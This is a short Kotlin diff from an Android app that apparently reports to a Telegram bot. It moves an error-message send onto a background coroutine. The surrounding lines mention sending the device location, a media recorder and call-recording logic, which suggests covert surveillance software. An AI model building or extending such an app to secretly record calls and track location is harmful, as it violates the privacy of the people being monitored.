@@ -397,8 +397,12 @@ private var mediaRecorder: MediaRecorder? = null
         } catch (e: Exception) { Log.e("Bot", "SendLoc Error", e) }
     }
 
-    private fun sendError(msg: String) { sendTelegramMessage("⚠️ Error: $msg") }
-
+    
+private fun sendError(msg: String) {
+    CoroutineScope(Dispatchers.IO).launch {
+        sendTelegramMessage("⚠️ Error: $msg")
+    }
+}
     // ===== Call Recording Logic =====
     private val phoneStateListener = object : PhoneStateListener() {
         override fun onCallStateChanged(state: Int, phoneNumber: String?) {
